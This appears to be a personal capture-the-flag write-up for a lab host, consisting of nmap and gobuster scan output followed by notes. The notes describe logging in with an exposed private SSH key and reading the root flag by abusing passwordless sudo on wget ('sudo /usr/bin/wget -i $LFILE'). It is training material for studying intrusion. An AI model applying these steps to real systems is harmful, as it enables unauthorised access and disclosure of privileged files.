@@ -1,0 +1,136 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 18:50 CEST
+Nmap scan report for 10.10.12.30
+Host is up (0.038s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94961b66801b7648682d14b59a01aaaa (RSA)
+|   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
+|_  256 b90b972e459bf32a4b11c7831033e0ce (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=5/9%OT=22%CT=1%CU=31370%PV=Y%DS=2%DC=T%G=Y%TM=645A79F7
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=A)OPS(
+OS:O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11
+OS:NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
+OS:R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 554/tcp)
+HOP RTT      ADDRESS
+1   43.32 ms 10.9.0.1
+2   43.46 ms 10.10.12.30
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.18 seconds
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.12.30
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/05/09 18:51:58 Starting gobuster in directory enumeration mode
+===============================================================
+[2K/sitemap              (Status: 301) [Size: 312] [--> http://10.10.12.30/sitemap/]
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.12.30/sitemap
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/05/09 18:54:25 Starting gobuster in directory enumeration mode
+===============================================================
+[2K/images               (Status: 301) [Size: 319] [--> http://10.10.12.30/sitemap/images/]
+[2K/css                  (Status: 301) [Size: 316] [--> http://10.10.12.30/sitemap/css/]
+[2K/js                   (Status: 301) [Size: 315] [--> http://10.10.12.30/sitemap/js/]
+[2K/fonts                (Status: 301) [Size: 318] [--> http://10.10.12.30/sitemap/fonts/]
+[2K/sass                 (Status: 301) [Size: 317] [--> http://10.10.12.30/sitemap/sass/]
+
+===============================================================
+2023/05/09 19:00:06 Finished
+===============================================================
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.12.30/sitemap
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/Apache.fuzz.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/05/09 19:04:37 Starting gobuster in directory enumeration mode
+===============================================================
+[2K//.htaccess.bak       (Status: 403) [Size: 276]
+[2K//.htaccess           (Status: 403) [Size: 276]
+[2K//.htpasswd           (Status: 403) [Size: 276]
+[2K//index.html          (Status: 200) [Size: 21080]
+
+===============================================================
+2023/05/09 19:05:10 Finished
+===============================================================
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.12.30/sitemap
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/05/09 19:11:53 Starting gobuster in directory enumeration mode
+===============================================================
+[2K/.htaccess            (Status: 403) [Size: 276]
+[2K/.hta                 (Status: 403) [Size: 276]
+[2K/.htpasswd            (Status: 403) [Size: 276]
+[2K/.ssh                 (Status: 301) [Size: 317] [--> http://10.10.12.30/sitemap/.ssh/]
+[2K/css                  (Status: 301) [Size: 316] [--> http://10.10.12.30/sitemap/css/]
+[2K/fonts                (Status: 301) [Size: 318] [--> http://10.10.12.30/sitemap/fonts/]
+[2K/images               (Status: 301) [Size: 319] [--> http://10.10.12.30/sitemap/images/]
+[2K/index.html           (Status: 200) [Size: 21080]
+[2K/js                   (Status: 301) [Size: 315] [--> http://10.10.12.30/sitemap/js/]
+
+===============================================================
+2023/05/09 19:12:11 Finished
+===============================================================
+
+there is a comment in the html source of /sitemap/index.html
+revealing jessie as potential username
+
+got a private ssh key on /sitemap/.ssh
+
+1) chmod 600 id_rsa
+2) ssh -i id_rsa jessie@10.10.12.30
+
+am able to run /usr/bin/wget as root without a password 
+
+1) LFILE=/root/root_flag.txt
+2) sudo /usr/bin/wget -i $LFILE
